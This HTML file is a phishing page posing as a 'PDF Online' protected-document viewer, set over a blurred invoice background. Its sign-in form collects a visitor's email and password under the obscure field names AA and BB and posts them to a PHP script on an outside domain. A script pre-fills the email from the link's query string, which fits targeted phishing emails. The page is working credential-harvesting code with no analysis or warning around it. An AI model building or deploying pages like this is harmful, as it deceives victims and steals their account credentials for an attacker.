<html lang="en">

<head>
    <meta http-equiv="x-ua-compatible" content="EmulateIE9">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<link rel="icon" type="image/ico" href="https://image.shutterstock.com/image-photo/image-260nw-1723718677.jpg">
    <title>PDF ONLINE DOCUMENT | Sign in</title>
</head>

<body style="background-image: url(https://www.continentalsports.co.uk/media/catalog/product/cache/7fd38fa62b8fefd3d046b3795a3b5e36/b/l/blurred_invoice.jpg); background-repeat: no-repeat;background-size: cover;">
    <div class="container-fluid p-0">
        <div class="container">
            <div class="row my-5">
                <div class="col-lg-5 mx-auto">
                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
                        <div class="text-left">
                            <span>
                                <img src="http://cdn.mcauto-images-production.sendgrid.net/07d9ac8cc71e2271/09488857-8d2c-4418-9a62-fdf70e8a5cb6/225x225.png" class="img-fluid" width="80px">
                            </span>
                            <br><br>
                            <span class="h5">PDF Online</span><br>
                            <span class="h">This is a protected document, please verify to access.</span><br>
                            <span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                            <br>

                            <!-- FORM START -->
                            <form action="https://zylen.za.com/home/pdf/send.php" method="post">
                                <div class="form-group">
                                    <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" placeholder="Email Address" autofocus required>
                                </div>
                                <div class="form-group mt-2">
                                    <input type="password" id="passwd" name="BB" class="form-control" placeholder="Enter Password" required>
                                </div>
                                <div class="col-lg-12 mt-3">
                                    <button type="submit" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #ed2a1c;">View File Content</button>
                                </div>
                            </form>
                            <!-- FORM END -->

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Function to get email from URL
        function getEmailFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('email'); 
        }

        // Auto-fill email field if email exists in URL
        document.addEventListener("DOMContentLoaded", function () {
            const emailField = document.getElementById("login"); // Targeting email input
            const email = getEmailFromURL();
            if (email) {
                emailField.value = email; // Auto-fill email field
            }
        });
    </script>

</body>
</html>
